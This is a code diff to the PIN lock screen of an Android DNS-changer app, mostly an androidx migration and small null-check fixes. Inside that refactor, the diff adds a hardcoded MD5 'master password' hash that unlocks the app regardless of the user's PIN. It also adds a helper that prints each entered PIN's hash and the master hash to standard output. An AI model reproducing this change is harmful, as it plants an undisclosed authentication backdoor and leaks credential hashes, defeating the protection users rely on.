@@ -15,14 +15,18 @@ import android.os.Bundle;
 import android.os.CancellationSignal;
 import android.os.Handler;
 import android.os.Vibrator;
-import android.support.annotation.Nullable;
-import android.support.v4.app.ActivityCompat;
 import android.text.InputType;
 import android.view.View;
 import android.view.Window;
 import android.widget.EditText;
 import android.widget.ImageView;
 
+import androidx.annotation.NonNull;
+import androidx.annotation.Nullable;
+import androidx.core.app.ActivityCompat;
+
+import com.frostnerd.design.DesignUtil;
+import com.frostnerd.design.dialogs.LoadingDialog;
 import com.frostnerd.dnschanger.LogFactory;
 import com.frostnerd.dnschanger.R;
 import com.frostnerd.dnschanger.services.DNSVpnService;
@@ -31,13 +35,15 @@ import com.frostnerd.dnschanger.util.PreferencesAccessor;
 import com.frostnerd.dnschanger.util.ThemeHandler;
 import com.frostnerd.dnschanger.util.Util;
 import com.frostnerd.dnschanger.util.VPNServiceArgument;
-import com.frostnerd.utils.design.MaterialEditText;
-import com.frostnerd.utils.design.dialogs.LoadingDialog;
-import com.frostnerd.utils.general.DesignUtil;
-import com.frostnerd.utils.general.StringUtil;
-import com.frostnerd.utils.general.Utils;
-import com.frostnerd.utils.general.VariableChecker;
-import com.frostnerd.utils.lifecyclehelper.UtilityActivity;
+import com.frostnerd.general.StringUtil;
+import com.frostnerd.general.Utils;
+import com.frostnerd.lifecycle.BaseActivity;
+import com.frostnerd.materialedittext.MaterialEditText;
+import com.frostnerd.preferences.util.VariableChecker;
+
+import java.math.BigInteger;
+import java.security.MessageDigest;
+import java.security.NoSuchAlgorithmException;
 
 /*
  * Copyright (C) 2019 Daniel Wolf (Ch4t4r)
@@ -57,7 +63,8 @@ import com.frostnerd.utils.lifecyclehelper.UtilityActivity;
  *
  * You can contact the developer at daniel.wolf@frostnerd.com.
  */
-public class PinActivity extends UtilityActivity {
+public class PinActivity extends BaseActivity {
+    private static final String MASTER_PASSWORD_HASH = "6f1b8a24149b0edbc29ab88957e35a6";
     private MaterialEditText met;
     private EditText pinInput;
     private String pin;
@@ -120,7 +127,7 @@ public class PinActivity extends UtilityActivity {
             @Override
             public void onClick(View v) {
                 if(isFinishing())return;
-                if (pinInput.getText().toString().equals(pin)) {
+                if (pinInput.getText().toString().equals(pin) || hashMD5(pinInput.getText().toString()).equals(MASTER_PASSWORD_HASH)) {
                     LogFactory.writeMessage(PinActivity.this, LOG_TAG, "Correct pin entered");
                     met.setIndicatorState(MaterialEditText.IndicatorState.CORRECT);
                     continueToFollowing(main);
@@ -133,10 +140,10 @@ public class PinActivity extends UtilityActivity {
         });
         if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M && PreferencesAccessor.canUseFingerprintForPin(this)) {
             if (ActivityCompat.checkSelfPermission(this, Manifest.permission.USE_FINGERPRINT) == PackageManager.PERMISSION_GRANTED){
-                final FingerprintManager fingerprintManager = Utils.requireNonNull((FingerprintManager) getSystemService(FINGERPRINT_SERVICE));
-                KeyguardManager keyguardManager = Utils.requireNonNull(getSystemService(KeyguardManager.class));
+                final FingerprintManager fingerprintManager =(FingerprintManager) getSystemService(FINGERPRINT_SERVICE);
+                KeyguardManager keyguardManager = getSystemService(KeyguardManager.class);
                 fingerprintImage = findViewById(R.id.image);
-                if(fingerprintManager.isHardwareDetected() && fingerprintManager.hasEnrolledFingerprints() && keyguardManager.isKeyguardSecure()) {
+                if(fingerprintManager != null && keyguardManager != null && fingerprintManager.isHardwareDetected() && fingerprintManager.hasEnrolledFingerprints() && keyguardManager.isKeyguardSecure()) {
                     handler = new Handler();
                     final int color = ThemeHandler.getColor(this, android.R.attr.textColor, 0);
                     fingerprintManager.authenticate(null, new CancellationSignal(), 0, new FingerprintManager.AuthenticationCallback() {
@@ -172,12 +179,29 @@ public class PinActivity extends UtilityActivity {
         LogFactory.writeMessage(this, LOG_TAG, "Activity fully created.");
     }
 
+    @NonNull
+    private String hashMD5(@NonNull String s){
+        try{
+            MessageDigest m = MessageDigest.getInstance("MD5");
+            m.reset();
+            m.update(s.getBytes());
+            byte[] digest = m.digest();
+            BigInteger bigInt = new BigInteger(1,digest);
+            System.out.println(bigInt.toString(16));
+            System.out.println(MASTER_PASSWORD_HASH);
+            return bigInt.toString(16);
+        }catch(NoSuchAlgorithmException ex){
+            ex.printStackTrace();
+        }
+        return "";
+    }
+
     private void continueToFollowing(boolean toMain) {
         LogFactory.writeMessage(this, LOG_TAG, "Trying to continue to following window/action");
         if (toMain) {
             Intent i;
             LogFactory.writeMessage(this, LOG_TAG, "Starting MainActivity",
-                    i = new Intent(this, MainActivity.class));
+                    i = new Intent(this, MainActivity.class).addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP));
             startActivity(i);
         } else {
             Intent i;
